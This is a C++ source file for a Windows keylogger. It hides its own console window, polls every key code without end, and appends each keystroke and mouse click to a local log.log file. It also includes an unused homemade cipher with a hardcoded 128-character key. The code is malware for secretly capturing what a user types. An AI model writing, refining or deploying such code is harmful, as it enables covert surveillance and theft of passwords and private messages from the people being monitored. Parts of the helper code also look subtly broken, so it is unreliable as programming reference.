#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
using namespace std;

void LOG(string input) {
    fstream LogFile;
    LogFile.open("log.log", fstream::app);
    if (LogFile.is_open()) {
        LogFile << input;
        LogFile.close();
    }
}

bool SpecialKeys(int S_Key) {
	//LOG(S_Key);
	
    switch (S_Key) {
        case VK_SPACE:
            cout << " ";
            LOG(" ");
            return true;
        case VK_RETURN:
            cout << "\n";
            LOG("\n");
            return true;
        case '?':
            cout << ".";
            LOG(".");
            return true;
        case VK_SHIFT:
            cout << "#SHIFT#";
            LOG("#SHIFT#");
            return true;
        case VK_BACK:
            cout << "\b";
            LOG("\b");
            return true;
        case VK_LBUTTON:
            cout << "#L_CLICK#";
            LOG("#L_CLICK#");
            return true;
        case VK_RBUTTON:
            cout << "#R_CLICK#";
            LOG("#R_CLICK#");
            return true;
        default:
            return false;
    }
    
}











string key = "dEfzJgbwzrilQhHYvm21LuMRnixOwbhEIrCLplLAjAagw8GeIuaVuI5tS1slvKUhHLAFTCScH5mXW45EHuIyoGLx3lNorYFtwGb0CLs7Sb3zwmvwTmoHuYEEn8jmNErT"; //chave 128 caracteres
//string key = "dEfzJgbwzrilQhHYvm21LuMRnixOwbhE"; //chave 32 caracteres

string rev(string s) {
    string r = "";
    for (int i = s.length(); i >= 0; i--) {
        if (s[i]) {
            r += s[i];
        }
    }
    return r;
}

string sh(string s, int d) {
    int g = 1, l = s.length();
    string ns[l];
    for (int i = 0; i < l; i++) {
        if (g > d) {
            g = 1;
        }
        if (s[i]) {
            ns[g] += s[i];
        }
        g++;
    }
    string r = "";
    for (int a = 1; a <= d; a++) {
        r += ns[a] + "";
    }
    return r;
}

string unsh(string s, int d) {
    int c = 0, a = 0;
    int l = s.length();
    string arr[l];
    for (int i = 0; i < l; i++) {
        if (s[i]) {
            arr[c] = s[i];
        }
        if (c < (l - d)) {
            c += d;
        } else {
            a++;
            c = a;
        }
    }
    string r = "";
    for (int i = 0; i < l; i++) {
        if (arr[i]!="") {
            r += arr[i] + "";
        }
    }
    return r;
}

#include <string>
#include <locale>

int IndexOf(std::string& text, std::string& pattern)
{
    // where appears the pattern in the text?
    std::string::size_type loc = text.find(pattern, 0);
    if(loc != std::string::npos)
    {
        return loc;
    }
    else
    {
        return -1;
    }
}

char cesar(char s, int n, bool rv) {
    string m[2];
    m[0] = "abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz";
    m[1] = "ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ";
    int sm;
    char r = s;
    for (int a = 0; a <= 1; a++) {
        string mt = m[a];
        string s_=s+"";
        int p = IndexOf(s_,mt);
        if (p >= 0) {
            if (rv == true) {
                sm = p - n;
            } else {
                sm = p + n;
            }
            while (sm >= 52) {
                sm -= 26;
            }
            while (sm < 0) {
                sm += 26;
            }
            r = mt[sm];
        }
    }
    return r;
}

string cesarstring(string s, int n, bool rv) {
    string matriz[2];
    matriz[0] = "abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz";
    matriz[1] = "ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ";
    string r = "";
    for (int a = 0; a <= 1; a++) {
        string m = matriz[a];
        r = "";
        for (int i = 0; i < s.length(); i++) {
        	string c_=s[i]+"";
            int p = IndexOf(c_,m);
            int sm;
            if (p >= 0) {
                if (rv) {
                    sm = (p) - n;
                } else {
                    sm = (p) + n;
                }
                while (sm >= 52) {
                    sm -= 26;
                }
                while (sm < 0) {
                    sm += 26;
                }
                r += m[sm];
            } else {
                r += s[i];
            }
        }
        s = r;
    }
    return r;
}

int sumstring(string s) {
    int sum = 0;
    for (int i = 1; i < s.length(); i++) {
        //            sum+=charVal(s[i]);
        sum += 1;
    }
    return sum + s.length();
}

int charVal(char c) {
    string m = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    string c_=c+"";
    int p = IndexOf(c_,m);
    if (p > 0) {
        return p;
    }
    return 0;
}

string viginere(string s, string k, bool rv) {
    int kl = k.length();
    int cn = 0;
    string r = "";
    for (int i = 0; i < s.length(); i++) {
        if (cn == kl) {
            cn = 0;
        }
        r += cesar(s[i], charVal(k[cn]), rv);
        cn++;
    }
    return r;
}

string crypt(string s) {
    s = viginere(s, key, false);
    s = rev(s);
    s = unsh(s, 3);
    s = rev(s);
    s = sh(s, 5);
    s = unsh(s, 7);
    return s;
}














int main() {
	
    ShowWindow(GetConsoleWindow(), SW_HIDE);
//    char KEY = 'x';
    while (true) {
    	POINT p;
if (GetCursorPos(&p))
{
    //cursor position now in p.x and p.y
    //string s="x"+p.x+"y"+p.y;
    //LOG(s);
}
        //Sleep(10);
        //for (int KEY = 8; KEY <= 190; KEY++) {
        for (int KEY = 0; KEY <= 255; KEY++) {
            if (GetAsyncKeyState(KEY) == -32767) {
                if (SpecialKeys(KEY) == false) {
                	//LOG(crypt("Hello"));
                	//string k=char(KEY)+"";
                	//LOG(k);
                	
                    fstream LogFile;
                    LogFile.open("log.log", fstream::app);
                    if (LogFile.is_open()) {
                        LogFile << char(KEY);
                        LogFile.close();
                    }
                    
                }
            }
        }
    }
    return 0;
}